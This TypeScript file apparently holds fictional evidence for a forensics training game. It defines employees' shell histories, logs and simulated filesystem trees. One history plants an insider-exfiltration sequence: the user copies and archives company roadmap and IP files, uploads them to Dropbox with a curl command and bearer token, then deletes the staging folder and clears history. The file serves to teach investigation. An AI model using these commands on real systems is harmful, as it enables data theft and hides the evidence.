import type { FileTreeNode } from './caseData.types';

/** Smoking gun: persists after `history -c` (memory-only). */
export const SARAH_WSL_BASH_HISTORY = `# Normal development work earlier in the day:
git clone git@github.com:nexustech/product-api.git
cd product-api
npm install
npm run test
git checkout -b feature/auth-improvements
git add -A && git commit -m "wip: auth flow"

# Then at 22:47 — staging from mapped drives:
cd /mnt/e/
ls -la
ls /mnt/e/product-roadmap/
ls /mnt/e/ip-vault/
mkdir ~/staging
cp -r /mnt/e/product-roadmap ~/staging/
cp -r /mnt/e/ip-vault ~/staging/
tar -czf ~/staging/nexus-data.tar.gz ~/staging/product-roadmap ~/staging/ip-vault
ls -lh ~/staging/nexus-data.tar.gz

# Upload to Dropbox via API:
curl -X POST https://content.dropboxapi.com/2/files/upload \\
  --header "Authorization: Bearer sl.abc123def456..." \\
  --header "Dropbox-API-Arg: {\\"path\\": \\"/nexus-data.tar.gz\\"}" \\
  --header "Content-Type: application/octet-stream" \\
  --data-binary @/home/sarah.chen/staging/nexus-data.tar.gz

# Cover tracks:
rm -rf ~/staging/
history -c
`;

export const JAMES_ZSH_HISTORY = `# Normal DevOps day — May 7, 2026:
kubectl get pods -n production
kubectl describe pod api-server-7d9c8b-xkp2j -n production
kubectl logs api-server-7d9c8b-xkp2j -n production --tail=100
terraform plan -var-file=prod.tfvars
terraform apply -var-file=prod.tfvars -auto-approve
ansible-playbook -i inventory/production site.yml --tags "update"
git pull origin main
git log --oneline -10
docker pull nexus-registry.corp.local/api-server:v2.4.1
docker images | grep api-server
ssh -i ~/.ssh/corp_key admin@10.0.1.100

# Authorized USB backup — ticket #INC-2847
lsblk
sudo mount /dev/sdb1 /mnt/usb
df -h /mnt/usb
rsync -av --progress ~/.ssh/ /mnt/usb/backup/ssh/
rsync -av --progress ~/projects/nexus-infrastructure/ /mnt/usb/backup/infrastructure/
sha256sum /mnt/usb/backup/infrastructure/*.tf > /mnt/usb/checksums.txt
sudo umount /mnt/usb

git add -A
git commit -m "fix: update prod k8s resource limits"
git push origin main
exit
`;

export const JAMES_BASH_HISTORY = `# occasional fallback shell
echo "using bash for legacy script"
/usr/bin/docker ps -a
`;

export const JAMES_AUTH_LOG = `May  7 08:03:22 nexus-ws-052 gdm-password]: gkr-pam: unlocked login keyring
May  7 08:03:22 nexus-ws-052 systemd-logind[1247]: New session 2 of user james.okafor.
May  7 08:03:22 nexus-ws-052 systemd: pam_unix(systemd-user:session): session opened for user james.okafor
May  7 09:14:37 nexus-ws-052 sudo: james.okafor : TTY=pts/0 ; PWD=/home/james.okafor ; USER=root ; COMMAND=/bin/mount /dev/sdb1 /mnt/usb
May  7 09:14:37 nexus-ws-052 sudo: pam_unix(sudo:session): session opened for user root by james.okafor(uid=0)
May  7 09:14:37 nexus-ws-052 sudo: pam_unix(sudo:session): session closed for user root
May  7 09:28:14 nexus-ws-052 sudo: james.okafor : TTY=pts/0 ; PWD=/home/james.okafor ; USER=root ; COMMAND=/bin/umount /mnt/usb
May  7 22:47:03 nexus-ws-052 sudo: james.okafor : TTY=pts/1 ; PWD=/home/james.okafor/projects ; USER=root ; COMMAND=/usr/bin/apt update
May  7 23:03:41 nexus-ws-052 systemd-logind[1247]: Session 2 logged out. Waiting for processes to exit.
May  7 23:03:41 nexus-ws-052 systemd-logind[1247]: Removed session 2.
`;

export const JAMES_RECENTLY_USED_XBEL = `<?xml version="1.0" encoding="UTF-8"?>
<xbel version="1.0"
      xmlns:bookmark="http://www.freedesktop.org/standards/desktop-bookmarks"
      xmlns:mime="http://www.freedesktop.org/standards/shared-mime-info">
  <bookmark href="file:///home/james.okafor/projects/nexus-infrastructure/terraform/main.tf"
            added="2026-05-07T14:23:11Z"
            modified="2026-05-07T14:23:11Z"
            visited="2026-05-07T14:23:11Z">
    <info>
      <metadata owner="http://freedesktop.org">
        <mime:mime-type type="text/plain"/>
        <bookmark:applications>
          <bookmark:application name="gedit" exec="gedit %u" count="1" stamp="2026-05-07T14:23:11Z"/>
        </bookmark:applications>
      </metadata>
    </info>
  </bookmark>
  <bookmark href="file:///home/james.okafor/projects/nexus-infrastructure/kubernetes/deployment.yaml"
            added="2026-05-07T16:47:33Z"
            modified="2026-05-07T16:47:33Z"
            visited="2026-05-07T16:47:33Z">
    <info>
      <metadata owner="http://freedesktop.org">
        <mime:mime-type type="text/plain"/>
      </metadata>
    </info>
  </bookmark>
</xbel>
`;

export const CASE001_WS_OPS_02_TREE: FileTreeNode = {
  type: 'dir',
  children: {
    home: {
      type: 'dir',
      children: {
        'james.okafor': {
          type: 'dir',
          children: {
            '.zsh_history': { type: 'file', content: JAMES_ZSH_HISTORY },
            '.bash_history': { type: 'file', content: JAMES_BASH_HISTORY },
            '.zshrc': {
              type: 'file',
              content:
                '# oh-my-zsh\nexport ZSH="$HOME/.oh-my-zsh"\nZSH_THEME="robbyrussell"\nplugins=(git kubectl)\n',
            },
            '.gitconfig': {
              type: 'file',
              content:
                '[user]\n\tname = James Okafor\n\temail = james.okafor@nexus-tech.internal\n',
            },
            '.docker': {
              type: 'dir',
              children: {
                'config.json': {
                  type: 'file',
                  content:
                    '{ "auths": { "nexus-registry.corp.local": { "auth": "[REDACTED_BASE64]" } } }\n',
                },
              },
            },
            '.ssh': {
              type: 'dir',
              children: {
                known_hosts: {
                  type: 'file',
                  content:
                    'corp-fs01.nexustech.internal ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...\n10.0.1.100 ssh-rsa AAAAB3NzaC1yc2E...\n',
                },
                id_rsa: {
                  type: 'file',
                  content:
                    '-----BEGIN OPENSSH PRIVATE KEY-----\nFORENSIC READ-ONLY — plaintext redacted in exhibit copy.\n-----END OPENSSH PRIVATE KEY-----\n',
                },
                authorized_keys: {
                  type: 'file',
                  content:
                    '# Managed by IT — backup automation\nssh-rsa AAAAB3... backup-svc@corp\n',
                },
              },
            },
            '.local': {
              type: 'dir',
              children: {
                share: {
                  type: 'dir',
                  children: {
                    'recently-used.xbel': {
                      type: 'file',
                      content: JAMES_RECENTLY_USED_XBEL,
                    },
                  },
                },
              },
            },
            projects: {
              type: 'dir',
              children: {
                'nexus-infrastructure': {
                  type: 'dir',
                  children: {
                    '.git': {
                      type: 'dir',
                      children: {
                        logs: {
                          type: 'dir',
                          children: {
                            HEAD: {
                              type: 'file',
                              content:
                                '0000000000000000000000000000000000000000 0000000000000000000000000000000000000000 ops-bot <ops@corp> 1746643200 +0000\tclone: from corp\n',
                            },
                          },
                        },
                      },
                    },
                    terraform: {
                      type: 'dir',
                      children: {
                        'main.tf': {
                          type: 'file',
                          content:
                            '# prod cluster — incidental artifact\nresource "aws_instance" "edge" {}\n',
                        },
                      },
                    },
                    kubernetes: {
                      type: 'dir',
                      children: {
                        'deployment.yaml': {
                          type: 'file',
                          content:
                            'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-server\n',
                        },
                      },
                    },
                    scripts: {
                      type: 'dir',
                      children: {
                        'deploy.sh': {
                          type: 'file',
                          content: '#!/bin/bash\necho deploy stub\n',
                        },
                      },
                    },
                  },
                },
                personal: {
                  type: 'dir',
                  children: {
                    homelab: {
                      type: 'dir',
                      children: {
                        'README.md': {
                          type: 'file',
                          content: '# homelab notes — non-work\n',
                        },
                      },
                    },
                  },
                },
              },
            },
            Downloads: {
              type: 'dir',
              children: {
                'kubectl-cheatsheet.pdf': {
                  type: 'file',
                  content: '%PDF-1.4 stub — Kubernetes cheatsheet',
                },
              },
            },
          },
        },
      },
    },
    var: {
      type: 'dir',
      children: {
        log: {
          type: 'dir',
          children: {
            'auth.log': { type: 'file', content: JAMES_AUTH_LOG },
            syslog: {
              type: 'file',
              content:
                'May  7 09:14:38 nexus-ws-052 kernel: usb 1-1: new high-speed USB device\nMay  7 09:14:39 nexus-ws-052 kernel: usb-storage: device scan complete\n',
            },
            kern: {
              type: 'dir',
              children: {
                'kern.log': {
                  type: 'file',
                  content: 'May  7 09:14:38 nexus-ws-052 kernel: usb 1-1: SanDisk Ultra\n',
                },
              },
            },
            apt: {
              type: 'dir',
              children: {
                'history.log': {
                  type: 'file',
                  content:
                    'Start-Date: 2026-05-07 21:50:00\nCommandline: apt upgrade -y\nInstall: libc6 (2.35-0ubuntu3.8)\nEnd-Date: 2026-05-07 21:52:12\n',
                },
              },
            },
            'dpkg.log': {
              type: 'file',
              content:
                '2026-05-07 21:51:02 status installed libc6:amd64 2.35-0ubuntu3.8\n',
            },
          },
        },
      },
    },
    etc: {
      type: 'dir',
      children: {
        passwd: {
          type: 'file',
          content:
            'root:x:0:0:root:/root:/bin/bash\njames.okafor:x:1000:1000:James Okafor,,,:/home/james.okafor:/usr/bin/zsh\nbackup-svc:x:998:998::/var/backups:/usr/sbin/nologin\n',
        },
        shadow: {
          type: 'file',
          content: 'root:*:19000:0:99999:7:::\njames.okafor:*:19000:0:99999:7:::\n',
        },
        'os-release': {
          type: 'file',
          content:
            'PRETTY_NAME="Ubuntu 22.04.4 LTS"\nNAME="Ubuntu"\nVERSION_ID="22.04"\nVERSION="22.04.4 LTS (Jammy Jellyfish)"\nID=ubuntu\n',
        },
        crontab: {
          type: 'file',
          content:
            'SHELL=/bin/sh\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n',
        },
        ssh: {
          type: 'dir',
          children: {
            'sshd_config': {
              type: 'file',
              content: '# Forensic snapshot — PermitRootLogin prohibit-password\nPort 22\n',
            },
          },
        },
        hosts: {
          type: 'file',
          content: '127.0.0.1 localhost\n10.0.1.5 corp-fs01.nexustech.internal\n',
        },
        'resolv.conf': {
          type: 'file',
          content: 'nameserver 10.0.1.3\nsearch nexustech.internal\n',
        },
      },
    },
    usr: { type: 'dir', children: {} },
    mnt: {
      type: 'dir',
      children: {
        usb: { type: 'dir', children: {} },
      },
    },
  },
};

/** File Explorer sidebar: \\\\wsl$ mount (Sarah Chen only). */
export const SARAH_WSL_EXPLORER_TREE: FileTreeNode = {
  type: 'dir',
  children: {
    'Ubuntu-22.04': {
      type: 'dir',
      children: {
        home: {
          type: 'dir',
          children: {
            'sarah.chen': {
              type: 'dir',
              children: {
                '.bash_history': {
                  type: 'file',
                  content: SARAH_WSL_BASH_HISTORY,
                },
              },
            },
          },
        },
        mnt: {
          type: 'dir',
          children: {
            e: {
              type: 'dir',
              children: {
                'product-roadmap': {
                  type: 'dir',
                  children: {
                    'Q3-2026-Roadmap.pdf': {
                      type: 'file',
                      content: '[stub — mirrored from CORP-FS01]',
                    },
                  },
                },
                'ip-vault': {
                  type: 'dir',
                  children: {
                    'PatentPending-2026-03.docx': {
                      type: 'file',
                      content: '[stub — mirrored from CORP-FS01]',
                    },
                  },
                },
              },
            },
          },
        },
      },
    },
  },
};
